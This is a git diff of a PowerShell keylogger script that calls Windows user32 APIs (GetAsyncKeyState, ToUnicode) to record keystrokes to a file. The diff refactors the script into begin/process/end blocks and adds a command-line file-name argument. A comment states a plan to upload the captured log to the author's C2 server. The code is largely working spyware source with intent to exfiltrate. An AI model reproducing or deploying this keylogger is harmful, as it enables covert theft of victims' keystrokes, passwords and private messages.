@@ -14,13 +14,14 @@ function title() {
 
 
 #requires -Version 2
-function Start-KeyLogger() {
+function Start-KeyLogger($name) {
 
-    $file_name = Read-Host "Enter the file name  to save the keylogs captured"
-    $path = "$(Get-Location)\$file_name"
+    begin {
+        $file_name = If ($name) { $name }else { Read-Host "Enter the file name  to save the keylogs captured" }
+        $path = "$(Get-Location)\$file_name"
 
-    # Signatures for API Calls
-    $signatures = @"
+        # Signatures for API Calls
+        $signatures = @"
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -31,17 +32,16 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 "@
 
-    # load signatures and make members available
-    $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
+        # load signatures and make members available
+        $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
     
-    # create output file
-    $file = New-Item -Path $path -ItemType File -Force
+        # create output file
+        $file = New-Item -Path $path -ItemType File -Force
 
-    try {
         Write-Host ""
         Write-Host "Starting keylogger..." -ForegroundColor Yellow
-        # create endless loop. When user presses CTRL+C, finally-block
-        # executes and shows the collected key presses
+    }
+    process {
         while ($true) {
             Start-Sleep -Milliseconds 40
       
@@ -76,16 +76,16 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
         }
     }
-    finally {
+    end {
         # open logger file in Notepad
         #will want instead to upload the file to my c2
         notepad $path
     }
 }
 
-function run() {
+function run($name) {
     title
-    Start-KeyLogger
+    Start-KeyLogger($name)
 }
 
-run
+run($args[0])
